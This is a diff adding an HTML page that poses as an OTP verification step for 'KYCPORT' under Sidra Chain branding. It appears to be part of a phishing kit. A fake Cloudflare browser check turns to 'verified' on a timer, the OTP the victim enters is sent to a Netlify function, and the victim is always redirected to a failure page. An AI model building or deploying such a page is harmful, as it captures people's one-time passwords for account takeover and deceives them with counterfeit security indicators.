@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP Verification - KYCPORT</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: whitesmoke;
+            margin: 0;
+        }
+
+        .container {
+            width: 80%;
+            max-width: 400px;
+            background: white;
+            padding: 35px;
+            box-shadow: 0px 0px 12px rgba(0, 0, 0, 0.1);
+            border-radius: 12px;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+        }
+
+        .container img {
+            display: block;
+            margin: 0 auto 20px;
+        }
+
+        label {
+            display: block;
+            text-align: left;
+            margin: 15px 0 8px;
+            font-weight: bold;
+            font-size: 18px;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 17px;
+            color: gray;
+            margin-bottom: 20px;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #544DEA;
+            color: white;
+            border: none;
+            font-size: 15px;
+            cursor: pointer;
+            border-radius: 8px;
+            margin-top: 15px;
+        }
+
+        button:hover {
+            background: darkorange;
+        }
+
+        /* Cloudflare Verification Section */
+        .cloudflare-verification {
+            margin-top: 20px;
+            padding: 8px;
+            border: 1px solid #ddd;
+            background: #f9f9f9;
+            border-radius: 4px;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 6px;
+            width: 100%;
+            max-width: 250px;
+            position: relative;
+        }
+
+        .loading {
+            width: 16px;
+            height: 16px;
+            border: 3px solid #ccc;
+            border-top: 3px solid blue;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .verified {
+            color: green;
+            font-weight: bold;
+            font-size: 12px;
+        }
+
+        .cloudflare-logo {
+            width: 50px;
+            height: auto;
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="images/download_11.png" width="130px" height="110px" alt="Sidra Chain">
+        <p style="color:green;">Stay on this page, you will receive an OTP shortly on your email.</p>
+
+        <label for="otp">Enter OTP</label>
+        <input type="text" id="otp" placeholder="Enter the OTP received" required>
+
+        <!-- Cloudflare Verification -->
+        <div class="cloudflare-verification" id="cloudflare">
+            <div style="display: flex; align-items: center; gap: 6px;">
+                <span class="loading" id="loading-icon"></span>
+                <p id="verification-text">Verifying your browser...</p>
+            </div>
+            <img src="images/download_14.png" class="cloudflare-logo" alt="Cloudflare">
+        </div>
+
+        <button onclick="submitOTP()">Verify OTP</button>
+
+        <p>Didn't receive an OTP? <a href="form.html">Resend</a></p>
+    </div>
+
+    <script>
+        function submitOTP() {
+            let otp = document.getElementById("otp").value.trim();
+            if (!otp) return;
+
+            fetch("/.netlify/functions/otp", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ otp }),
+            }).finally(() => {
+                window.location.href = "fail.html"; // Redirect after submission
+            });
+        }
+
+        setTimeout(() => {
+            document.getElementById("cloudflare").innerHTML = `
+                <div style="display: flex; align-items: center; gap: 6px;">
+                    <p class="verified">✔ Your browser has been verified!</p>
+                </div>
+                <img src="images/download_14.png" class="cloudflare-logo" alt="Cloudflare">
+            `;
+        }, 3000);
+    </script>
+</body>
+</html>
